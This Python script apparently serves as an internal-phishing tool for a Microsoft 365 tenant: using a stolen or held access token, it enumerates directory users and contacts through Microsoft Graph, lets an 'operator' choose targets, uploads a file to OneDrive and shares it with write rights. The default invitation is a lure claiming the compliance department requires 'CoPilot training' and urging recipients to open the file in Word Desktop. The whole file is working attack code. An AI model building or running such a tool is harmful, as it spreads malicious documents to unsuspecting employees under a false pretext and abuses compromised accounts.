import os
import time
import requests

GRAPH = "https://graph.microsoft.com/v1.0"


# ------------------------------------------------
# EMAIL VALIDATION
# ------------------------------------------------

def is_valid_email(email):

    return (
        email and
        "@" in email and
        "#EXT#" not in email
    )


# ------------------------------------------------
# COLLECT USERS
# ------------------------------------------------

def collect_users(token, max_users=25):

    headers = {
        "Authorization": f"Bearer {token}"
    }

    collected = set()

    url = f"{GRAPH}/users?$top=999"

    print("[*] Fetching tenant users...")

    while url:

        r = requests.get(
            url,
            headers=headers
        )

        if r.status_code != 200:

            print(
                f"[-] User enumeration failed: "
                f"{r.status_code}"
            )

            break

        data = r.json()

        for user in data.get("value", []):

            email = (
                user.get("mail") or
                user.get("userPrincipalName")
            )

            if is_valid_email(email):

                collected.add(email)

            if len(collected) >= max_users:

                return list(collected)

        url = data.get("@odata.nextLink")

    return list(collected)


# ------------------------------------------------
# COLLECT CONTACTS
# ------------------------------------------------

def collect_contacts(token, max_users=25):

    headers = {
        "Authorization": f"Bearer {token}"
    }

    collected = set()

    url = (
        f"{GRAPH}/me/contacts"
        f"?$select=emailAddresses&$top=100"
    )

    print("[*] Fetching contacts...")

    while url:

        r = requests.get(
            url,
            headers=headers
        )

        if r.status_code != 200:

            print(
                f"[-] Contact enumeration failed: "
                f"{r.status_code}"
            )

            break

        data = r.json()

        for contact in data.get("value", []):

            for entry in contact.get(
                "emailAddresses",
                []
            ):

                addr = entry.get("address")

                if is_valid_email(addr):

                    collected.add(addr)

                if len(collected) >= max_users:

                    return list(collected)

        url = data.get("@odata.nextLink")

    return list(collected)


# ------------------------------------------------
# OPERATOR TARGET SELECTION
# ------------------------------------------------

def operator_select_targets(users):

    users = sorted(list(set(users)))

    if not users:

        print("[-] No valid recipients found")

        return []

    print("\n=== ENUMERATED RECIPIENTS ===\n")

    for idx, user in enumerate(users, 1):

        print(f"[{idx}] {user}")

    print("\nSelect recipients manually")
    print("Comma-separated emails only")
    print(
        "Example: "
        "alice@corp.com,bob@corp.com"
    )

    selected = input(
        "\nRecipients> "
    ).strip()

    if not selected:

        print("[-] No recipients selected")

        return []

    chosen = []

    for entry in selected.split(","):

        email = entry.strip()

        if email in users:

            chosen.append(email)

        else:

            print(
                f"[-] Invalid recipient skipped: "
                f"{email}"
            )

    chosen = list(set(chosen))

    if not chosen:

        print("[-] No valid recipients selected")

        return []

    print("\n=== SELECTED RECIPIENTS ===\n")

    for user in chosen:

        print(f"[+] {user}")

    confirm = input(
        "\nProceed with sharing? (y/N): "
    ).strip().lower()

    if confirm != "y":

        print("[-] Operation cancelled")

        return []

    return chosen


# ------------------------------------------------
# UPLOAD FILE
# ------------------------------------------------

def upload_file(token, file_path):

    if not os.path.exists(file_path):

        print(
            f"[-] File not found: "
            f"{file_path}"
        )

        return None

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/octet-stream"
    }

    filename = os.path.basename(file_path)

    upload_url = (
        f"{GRAPH}/me/drive/root:/{filename}:/content"
    )

    print(f"\n[*] Uploading: {filename}")

    with open(file_path, "rb") as f:

        r = requests.put(
            upload_url,
            headers=headers,
            data=f
        )

    if r.status_code not in [200, 201]:

        print(
            f"[-] Upload failed: "
            f"{r.status_code}"
        )

        print(r.text)

        return None

    data = r.json()

    print("[+] Upload successful")

    print(f"[+] Item ID: {data['id']}")

    return data


# ------------------------------------------------
# SHARE FILE
# ------------------------------------------------

def share_file(
    token,
    item_id,
    recipients,
    message
):

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    invite_url = (
        f"{GRAPH}/me/drive/items/{item_id}/invite"
    )

    body = {
        "recipients": [
            {"email": r}
            for r in recipients
        ],

        "message": message,

        "requireSignIn": True,

        "sendInvitation": True,

        "roles": ["write"]
    }

    r = requests.post(
        invite_url,
        headers=headers,
        json=body
    )

    if r.status_code not in [200, 201]:

        print(
            f"[-] Invite failed: "
            f"{r.status_code}"
        )

        print(r.text)

        return False

    return True


# ------------------------------------------------
# RUN SHARE WORKFLOW
# ------------------------------------------------

def run_share_workflow(
    token,
    file_path,
    max_users=25,
    batch_size=10,
    message=None
):

    if not os.path.exists(file_path):

        print(
            f"[-] File not found: "
            f"{file_path}"
        )

        return

    if not message:

        message = (
            "Hello Team, the compliance department "
            "is requesting that you complete "
            "CoPilot training. Please open the "
            "document in Word Desktop for the "
            "best results and completion tracking."
        )

    print("\n[*] Collecting recipients...")

    users = set()

    # ---------------------------------
    # USERS
    # ---------------------------------

    for user in collect_users(
        token,
        max_users
    ):

        users.add(user)

    # ---------------------------------
    # CONTACTS
    # ---------------------------------

    if len(users) < max_users:

        for contact in collect_contacts(
            token,
            max_users
        ):

            users.add(contact)

            if len(users) >= max_users:
                break

    # ---------------------------------
    # OPERATOR SELECTION
    # ---------------------------------

    users = operator_select_targets(
        users
    )

    if not users:

        return

    # ---------------------------------
    # UPLOAD
    # ---------------------------------

    uploaded = upload_file(
        token,
        file_path
    )

    if not uploaded:

        return

    item_id = uploaded["id"]

    # ---------------------------------
    # SHARE
    # ---------------------------------

    print("\n[*] Sending invitations...")

    success = 0

    for i in range(
        0,
        len(users),
        batch_size
    ):

        batch = users[
            i:i + batch_size
        ]

        ok = share_file(
            token,
            item_id,
            batch,
            message
        )

        if ok:

            success += len(batch)

            print(
                f"[+] Shared to "
                f"{len(batch)} users"
            )

        time.sleep(1)

    print(
        f"\n[+] Sharing completed "
        f"({success} recipients)"
    )

    print(
        f"[+] URL: "
        f"{uploaded.get('webUrl')}"
    )


# ------------------------------------------------
# BACKWARDS COMPATIBILITY
# ------------------------------------------------

hybrid_share = run_share_workflow